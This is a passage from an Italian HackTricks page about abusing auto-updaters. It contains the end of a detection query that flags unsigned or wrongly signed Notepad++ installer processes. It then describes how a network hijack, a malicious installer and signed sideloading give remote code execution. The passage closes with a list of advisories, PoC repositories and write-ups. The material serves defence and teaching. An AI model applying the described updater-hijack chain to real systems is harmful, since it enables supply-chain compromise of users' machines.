| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Questi pattern si applicano a qualsiasi programma di aggiornamento che accetti manifest non firmati o non verifichi in modo vincolante i firmatari dell’installer: hijack della rete + installer malevolo + sideloading firmato BYO consentono l’esecuzione di codice da remoto, mascherata da aggiornamento “attendibile”.

---
## References
- [1] [Avviso – Netskope Client per Windows – Escalation locale dei privilegi tramite server rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avviso di sicurezza Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC di Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Compromissione di ASUS DriverHub, MSI Center, Acer Control Centre e Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalation locale dei privilegi tramite file scrivibili in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalation dei privilegi nell’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC di sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Attori statali sfruttano la supply chain di Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – aggiornamento sull’incidente di compromissione dell’infrastruttura](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Eludere la correzione di CVE-2025-0309 in Netskope Client per Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Scoprire bug di escalation dei privilegi in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
